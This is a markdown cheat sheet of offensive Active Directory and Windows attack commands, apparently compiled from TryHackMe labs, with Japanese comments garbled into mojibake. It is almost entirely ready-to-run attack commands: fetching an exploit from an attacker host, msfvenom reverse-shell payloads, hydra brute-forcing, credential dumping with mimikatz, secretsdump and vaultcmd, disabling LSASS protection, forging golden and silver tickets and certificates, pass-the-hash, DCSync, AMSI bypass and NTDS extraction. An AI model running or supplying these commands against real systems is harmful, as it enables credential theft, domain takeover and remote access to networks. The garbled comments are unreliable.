<!-- MarkdownTOC -->

- Powershell
- powershell_download_file
- enum4linux
- bloodhound
- rpcclient
- ldapsearch
- wpscan
- nikto
- hydra
- icacls
- vaultcmd
- cmdkey
- RunAs
- smbclient
- msfvenom
- impacket
	- impacket-GetNPUsers
	- impacket-GetUserSPNs
	- impacket-secretsdump
	- impakcet-psexec
- kekeo
- Invoke-Mimikatz
- mimikatz
- ForgeCert
- Rubeus
- NTDS Util
- evil-winrm
- DCSync
- xfreerdp
- hashcat

<!-- /MarkdownTOC -->

# Powershell
```shell
# ��`����׷��
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"

# ��`���Η���
Get-ADGroupMember -Identity "IT Support"

```

# powershell_download_file
```shell
powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PORT/exploit.exe','exploit.exe'"
```

# enum4linux
```shell
enum4linux IP

# ���Ԕ�����В�
enum4linux -a IP
```
# bloodhound
```shell
# Remote
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller Ip> -d <Domain> -c All

# On site

.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller Ip> --OutputDirectory <PathToFile>

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>

```

# rpcclient
```shell
rpcclient -U "" -N 10.200.16.100
```

# ldapsearch
```shell
ldapserach -x -H ldap://dc-ip-here -s base namingcontexts
ldapsearch -LLL -x -H ldap://10.200.16.100 -b '' -s base '(objectclass=*)'
```

# wpscan
```shell
wpscan --url IP

# ��`���В�
wpscan --url IP --enumerate u
```

# nikto
```shell
nikto --url IP_ADDRESS | tee nikto-results
```

# hydra
```shell
hydra -l USERNAME -p PASSWORD IPADDRESS ftp
hydra -L USERLIST -P PASSLIST ssh://IPADDRESS
hydra -l USERNAME -P PASSLIST http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:wrongPASS'
hydra -L USERLIST -p password IPADDRESS http-get '/:A=NTLM:F=401'
```

# icacls
```bat
icacls
```
# vaultcmd
```bat
rem�����椵��Ƥ����Y�������В� 
vaultcmd /list

rem Web Credentials Vault�˱��椵��Ƥ����Y����󤬤��뤫�_�J
vaultcmd /listproperties:"Web Credentials"

rem ���椵��Ƥ����Y������Ԕ����_�J
vaultcmd /listcreds:"Web Credentials"
```

# cmdkey
```bat
cmdkey /list
```

# RunAs
```bat
runas /savecred /user:THM.red\thm-local cmd.exe
```

# smbclient
```shell
# �ӾA
smbclient //10.10.10.10/sharename -U username -p port
smbclient -U "username" \\\\domain.local\\sharename

# �В�
smbclient -U "svc-admin" -L domain.local

# �������`�ɤǤ����Τ�ȫ�ƥ������`��
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

# msfvenom
```shell
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.8.109.203 lport=1234 -f elf -o exploit.elf
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.109.203 lport=1234 -f sh -o exploit.sh
```

# impacket
## impacket-GetNPUsers
```shell
# Kerberos��ǰ�J�^���Ҫ�Ȥ��ʤ��O���ˤʤäƤ���AD��`���Υѥ���`�ɥϥå���ȡ��
impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.10.10 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
impacket-GetNPUsers spookysec.local/backup -no-pass -dc-ip 10.10.10.10
```

## impacket-GetUserSPNs
```shell
impacket-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!"
impakcet-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!" -request-user svc-user
```

## impacket-secretsdump
```shell
impacket-secretsdump -security path/to/security -system path/to/system -ntds path/to/ntds.dit
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impakcet-secretsdump spookysec.local\backup:password123@spookysec.local
```

## impakcet-psexec
```shell
impacket-psexec Administrator:@spookysec.local -hashes 0e363213e37b94221497260b0bcb4fc
```

# kekeo
```bat
rem ���`�ӥ��Υ����å�����
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password
```

# Invoke-Mimikatz
```shell
import-module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
```

# mimikatz
```bat
rem lsa���o��o���ˤ���ɥ饤�Ф򥤥�ݩ`�Ȥ��Ɵo����
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove

rem SeDebugPrivilege���ޤ��Є��ˤ��ƤߤƬF�ڤΘ��ޤ�_�J
mimikatz # privilege::debug

rem ���
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::credman

rem SYSTEM��`���ؤΤʤꤹ�ޤ�
mimikatz # token::elevate

rem �쥸���ȥ�ϥ��֤����Y������ƽ�Ĥ�ȡ��
mimikatz # lsadump::secrets

rem �g�Х���ȡ�����O��
mimikatz # log dcdump.txt

rem DCͬ�ڤ����ä��ƥϥå�������
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all

rem ���`��ǥ�����åȂ���
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt

rem ����Щ`�����åȂ���
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:16f9af38fca3ada405386b3b57366082 /service:cifs /ptt

rem DC�˱��椵��Ƥ����^�����Υ����å�
mimikatz # crypto::certificates /systemstore:local_machine 
rem Exportable key: NO���O������Ƥ����Ϥ��i���z��ѥå�
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
rem �^�������`�Υ������ݩ`��
mimikatz # crypto::certificates /systemstore:local_machine /export
```

# ForgeCert
```bat
rem �������ݩ`�Ȥ����^������ʹ�äƄe���^��������
ForgeCert.exe --CaCertPath local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

# Rubeus
```bat
rem ���ä��^������ʹ�ä�TGT�ꥯ����������
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fulladmin.pfx /password:Password123 /outfile:fulladmin.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
```

# NTDS Util
```bat
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

# evil-winrm
```shell
# login
evil-winrm -u user -p password -i 10.10.10.10

# PtH
evil-winrm -u user -H 0e363213e37b94221497260b0bcb4fc -i 10.10.10.10

menu
Bypass-4MSI
```

# DCSync
```shell
$pass = convertto-securestring 'password' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\user', $pass)
add-objectACL -principalidentity user -credential $cred -rights DCSync
```

# xfreerdp
```shell
# login
xfreerdp /u:user /p:password /v:10.10.10.10 +clipboard /size:1920x1080

# PtH
xfreerdp /u:user /H:0e363213e37b94221497260b0bcb4fc /v:10.10.10.10 +clipboard /size:1920x1080
```

# hashcat
[hash example](https://hashcat.net/wiki/doku.php?id=example_hashes)
```shell
# �Ǖ�����
hashcat -m 1400 -a 0 hash.txt password.lst

# �֥�`�ȥե��`��
hashcat -m 1400 -a 3 hash.txt
```